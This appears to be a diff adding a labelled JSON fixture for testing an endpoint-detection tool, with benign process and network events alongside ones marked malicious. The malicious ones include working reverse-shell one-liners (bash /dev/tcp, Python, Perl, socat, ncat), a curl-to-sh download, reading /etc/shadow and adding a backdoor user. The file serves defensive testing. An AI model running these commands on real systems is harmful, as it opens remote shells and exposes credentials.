@@ -1,0 +1,265 @@
+{
+  "schema_version": "v0.1",
+  "samples": [
+    {
+      "id": "S01",
+      "malicious": true,
+      "subject": {
+        "process_name": "bash",
+        "process_path": "/usr/bin/bash",
+        "cmdline": "bash -c curl http://203.0.113.10/p.sh | sh"
+      },
+      "object": {}
+    },
+    {
+      "id": "S02",
+      "malicious": true,
+      "subject": {
+        "process_name": "cat",
+        "process_path": "/usr/bin/cat",
+        "cmdline": "cat /etc/shadow"
+      },
+      "object": {}
+    },
+    {
+      "id": "S03",
+      "malicious": true,
+      "subject": {
+        "process_name": "bash",
+        "process_path": "/usr/bin/bash",
+        "cmdline": "bash -i >& /dev/tcp/203.0.113.66/4444 0>&1"
+      },
+      "object": {}
+    },
+    {
+      "id": "S04",
+      "malicious": true,
+      "subject": {
+        "process_name": "python3",
+        "process_path": "/usr/bin/python3",
+        "cmdline": "python3 -m http.server 8000"
+      },
+      "object": {}
+    },
+    {
+      "id": "S05",
+      "malicious": true,
+      "subject": {
+        "process_name": "edr-malware",
+        "process_path": "/tmp/edr-malware",
+        "cmdline": "/tmp/edr-malware"
+      },
+      "object": {}
+    },
+    {
+      "id": "S06",
+      "malicious": true,
+      "subject": {},
+      "object": {
+        "protocol": "tcp",
+        "local_port": 4444,
+        "remote_addr": "0.0.0.0"
+      }
+    },
+    {
+      "id": "S07",
+      "malicious": true,
+      "subject": {},
+      "object": {
+        "protocol": "tcp",
+        "local_port": 443,
+        "remote_addr": "203.0.113.66"
+      }
+    },
+    {
+      "id": "S08",
+      "malicious": true,
+      "subject": {
+        "process_name": "useradd",
+        "process_path": "/usr/sbin/useradd",
+        "cmdline": "useradd backdoor"
+      },
+      "object": {}
+    },
+    {
+      "id": "F01",
+      "malicious": false,
+      "subject": {
+        "process_name": "apt",
+        "process_path": "/usr/bin/apt",
+        "cmdline": "apt update"
+      },
+      "object": {}
+    },
+    {
+      "id": "F02",
+      "malicious": false,
+      "subject": {
+        "process_name": "python3",
+        "process_path": "/usr/bin/python3",
+        "cmdline": "python3 app.py"
+      },
+      "object": {}
+    },
+    {
+      "id": "F03",
+      "malicious": false,
+      "subject": {},
+      "object": {
+        "protocol": "tcp",
+        "local_port": 22,
+        "remote_addr": "198.51.100.5"
+      }
+    },
+    {
+      "id": "F04",
+      "malicious": false,
+      "subject": {
+        "process_name": "bash",
+        "process_path": "/usr/bin/bash",
+        "cmdline": "bash -lc echo safe"
+      },
+      "object": {}
+    },
+    {
+      "id": "F05",
+      "malicious": false,
+      "subject": {
+        "process_name": "cat",
+        "process_path": "/usr/bin/cat",
+        "cmdline": "cat /etc/passwd"
+      },
+      "object": {}
+    },
+    {
+      "id": "F06",
+      "malicious": false,
+      "subject": {},
+      "object": {
+        "protocol": "udp",
+        "local_port": 53,
+        "remote_addr": "8.8.8.8"
+      }
+    },
+    {
+      "id": "F07",
+      "malicious": false,
+      "subject": {
+        "process_name": "curl",
+        "process_path": "/usr/bin/curl",
+        "cmdline": "curl https://example.com"
+      },
+      "object": {}
+    },
+    {
+      "id": "F08",
+      "malicious": false,
+      "subject": {
+        "process_name": "systemctl",
+        "process_path": "/usr/bin/systemctl",
+        "cmdline": "systemctl status ssh"
+      },
+      "object": {}
+    },
+    {
+      "id": "S09",
+      "malicious": true,
+      "subject": {
+        "process_name": "edr-denied",
+        "process_path": "/tmp/edr-denied",
+        "cmdline": "/tmp/edr-denied"
+      },
+      "object": {}
+    },
+    {
+      "id": "F09",
+      "malicious": false,
+      "subject": {
+        "process_name": "python3",
+        "process_path": "/usr/bin/python3",
+        "cmdline": "python3 app.py"
+      },
+      "object": {}
+    },
+    {
+      "id": "S10",
+      "malicious": true,
+      "subject": {
+        "process_name": "python3",
+        "process_path": "/usr/bin/python3",
+        "cmdline": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
+      },
+      "object": {}
+    },
+    {
+      "id": "S11",
+      "malicious": true,
+      "subject": {
+        "process_name": "socat",
+        "process_path": "/usr/bin/socat",
+        "cmdline": "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4444"
+      },
+      "object": {}
+    },
+    {
+      "id": "S12",
+      "malicious": true,
+      "subject": {
+        "process_name": "perl",
+        "process_path": "/usr/bin/perl",
+        "cmdline": "perl -e 'use IO::Socket::INET;$s=IO::Socket::INET->new(PeerAddr=>\"10.0.0.1:4444\");open(STDIN,\"<&\",$s);open(STDOUT,\">&\",$s);open(STDERR,\">&\",$s);exec(\"/bin/sh -i\");'"
+      },
+      "object": {}
+    },
+    {
+      "id": "S13",
+      "malicious": true,
+      "subject": {
+        "process_name": "ncat",
+        "process_path": "/usr/bin/ncat",
+        "cmdline": "ncat -e /bin/bash 10.0.0.1 4444"
+      },
+      "object": {}
+    },
+    {
+      "id": "F10",
+      "malicious": false,
+      "subject": {
+        "process_name": "python3",
+        "process_path": "/usr/bin/python3",
+        "cmdline": "python3 -c 'print(42)'"
+      },
+      "object": {}
+    },
+    {
+      "id": "F11",
+      "malicious": false,
+      "subject": {
+        "process_name": "socat",
+        "process_path": "/usr/bin/socat",
+        "cmdline": "socat -v tcp:example.com:80 -"
+      },
+      "object": {}
+    },
+    {
+      "id": "F12",
+      "malicious": false,
+      "subject": {
+        "process_name": "perl",
+        "process_path": "/usr/bin/perl",
+        "cmdline": "perl -e 'print \"hello\"'"
+      },
+      "object": {}
+    },
+    {
+      "id": "F13",
+      "malicious": false,
+      "subject": {
+        "process_name": "ss",
+        "process_path": "/usr/bin/ss",
+        "cmdline": "ss -tlnp"
+      },
+      "object": {}
+    }
+  ]
+}
